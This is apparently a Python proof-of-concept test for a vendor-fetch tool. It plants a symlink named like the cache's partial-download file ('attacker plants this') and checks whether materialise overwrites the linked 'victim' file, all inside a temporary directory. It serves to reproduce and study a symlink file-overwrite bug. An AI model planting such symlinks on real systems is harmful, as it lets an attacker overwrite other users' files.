import io, os, sys, tarfile, tempfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fetch_vendor_shim as fv  # loads the lane tool by path

body = b'sqsh' + b'VENDORBYTES' * 500
bio = io.BytesIO()
with tarfile.open(fileobj=bio, mode='w') as tf:
    ti = tarfile.TarInfo('./var/tmp/filesystem.image'); ti.size = len(body)
    tf.addfile(ti, io.BytesIO(body))
image = bio.getvalue(); pin = fv.sha256(body)

def fake(url, ic, want): return image, 'fake'

d = tempfile.mkdtemp()
cache = os.path.join(d, 'cache'); os.makedirs(cache)
victim = os.path.join(d, 'lane_evidence_oracle.tsv')
open(victim, 'w').write('original lane file\n')
os.symlink(victim, os.path.join(cache, pin + '.bin.part'))   # attacker plants this
rec = fv.materialise({'id': 'V3', 'sha256': pin, 'external': {
    'url': 'x://', 'image_sha256': fv.sha256(image),
    'member': './var/tmp/filesystem.image', 'length': len(body)}}, cache, None, fake)
print('ok =', rec['ok'])
print('victim now %d bytes, starts %r (was 18 bytes ascii)' % (
    os.path.getsize(victim), open(victim, 'rb').read(12)))
print('cache tree:', sorted(os.listdir(cache)))
